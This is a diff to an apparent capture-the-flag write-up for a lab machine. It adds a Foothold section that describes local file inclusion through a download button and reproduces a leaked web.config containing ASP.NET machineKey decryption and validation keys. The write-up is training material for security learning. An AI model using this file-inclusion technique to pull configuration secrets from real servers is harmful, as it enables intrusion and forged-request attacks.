@@ -75,11 +75,35 @@ echo '10.129.230.183 dev.pov.htb' | sudo tee -a /etc/hosts
 ---
 ## Foothold
 
-How you gained initial access to the machine.
+### Local File Inclusion on the download button
 
-### Vulnerability
+```
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Type: application/octet-stream
+Server: Microsoft-IIS/10.0
+Content-Disposition: attachment; filename=C:\inetpub\wwwroot\dev\web.config
+X-AspNet-Version: 4.0.30319
+X-Powered-By: ASP.NET
+Date: Wed, 23 Sep 2026 10:37:03 GMT
+Content-Length: 866
 
-Description of the vulnerability exploited.
+<configuration>
+  <system.web>
+    <customErrors mode="On" defaultRedirect="default.aspx" />
+    <httpRuntime targetFramework="4.5" />
+    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
+  </system.web>
+    <system.webServer>
+        <httpErrors>
+            <remove statusCode="403" subStatusCode="-1" />
+            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
+        </httpErrors>
+        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
+    </system.webServer>
+</configuration>
+
+```
 
 ### Exploitation
 
